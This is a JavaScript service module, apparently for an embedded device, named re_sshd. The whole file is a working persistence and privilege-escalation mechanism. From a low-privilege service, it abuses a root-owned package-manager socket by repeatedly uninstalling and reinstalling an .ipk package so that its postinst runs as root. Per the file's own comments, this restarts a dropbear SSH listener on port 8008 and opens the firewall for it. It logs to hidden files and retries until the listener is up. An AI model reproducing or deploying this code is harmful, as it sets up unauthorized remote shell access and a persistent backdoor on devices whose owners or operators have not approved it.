"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
// 09.09O: services resolve the SDK through the phoenix globals (the
// 09.60-era "@sdk/baseService.js" alias does not exist on this build).
const fsLoad = require("fs");
try { fsLoad.appendFileSync("/tmp/re_sshd_boot.log", new Date().toISOString() + " module loaded\n"); } catch (e) {}
const { BaseService } = require(globalThis.PHOENIX_LIB + '/baseService.js');
const net = require("net");
const fs = require("fs");

const D = "/APPS/.re_sshd";
const MARKER = D + "/boot_marker.txt";
const SOCKET = "/var/run/superwatch_socket";
/* superwatch opkg protocol, 09.09O ids (pkgmgr/PackageInstall.js):
   54 = uninstall, 53 = install; sid 10-99. The install re-runs postinst
   as uid 0, which restarts dropbear on 8008 and re-adds the iptables ACCEPT. */
const PAYLOADS = [
    "80:54:80;re.installer",
    "81:53:81;/APPS/installer.ipk;re.installer;"
];

function log(msg) {
    try { fs.appendFileSync(MARKER, new Date().toISOString() + " " + msg + "\n"); } catch (e) {}
}

function dropbearRunning() {
    /* do NOT read dropbear.pid: postinst leaves it mode 640 root:root and the
       service (uid 314) gets EACCES, so a pid-file check always reports "not
       running" and the arm loop re-installs forever. Detect the 8008 listener
       in /proc/net/tcp instead: 1F48 = 8008, state 0A = LISTEN. */
    try {
        const tcp = fs.readFileSync("/proc/net/tcp", "utf8");
        const lines = tcp.split("\n");
        for (let i = 0; i < lines.length; i++) {
            const f = lines[i].trim().split(/\s+/);
            if (f.length < 10) continue;
            if (f[1] && f[1].split(":")[1] === "1F48" && f[3] === "0A") return true;
        }
    } catch (e) { log("tcp check error: " + e); }
    return false;
}

function sendOne(payload) {
    return new Promise((resolve) => {
        let chunks = [];
        const c = net.createConnection(SOCKET, () => {
            const b = Buffer.from(payload, "utf8");
            const h = Buffer.alloc(4); h.writeUInt32LE(b.length, 0);
            c.write(Buffer.concat([h, b]));
        });
        c.setTimeout(15000);
        c.on("data", d => chunks.push(d));
        c.on("end", () => resolve(Buffer.concat(chunks).toString("utf8").slice(0, 120)));
        c.on("timeout", () => { c.destroy(); resolve("TIMEOUT"); });
        c.on("error", e => resolve("ERR " + e.message));
    });
}

async function arm() {
    for (let i = 1; i <= 36; i++) {
        if (dropbearRunning()) { log("dropbear already running"); return; }
        const r1 = await sendOne(PAYLOADS[0]);
        const r2 = await sendOne(PAYLOADS[1]);
        log("attempt " + i + " uninstall=[" + r1 + "] install=[" + r2 + "]");
        await new Promise(r => setTimeout(r, 5000));
        if (dropbearRunning()) { log("ARMED: dropbear up"); return; }
    }
    log("GAVE UP after 36 attempts");
}

class ReSshd extends BaseService {
    constructor(name, dest) { super(name, dest); }
    async start() {
        log("re_sshd start pid=" + process.pid + " uid=" + process.getuid());
        if (dropbearRunning()) { log("dropbear already running"); return; }
        arm().catch(e => log("arm error: " + e));
    }
}
module.exports = ReSshd;
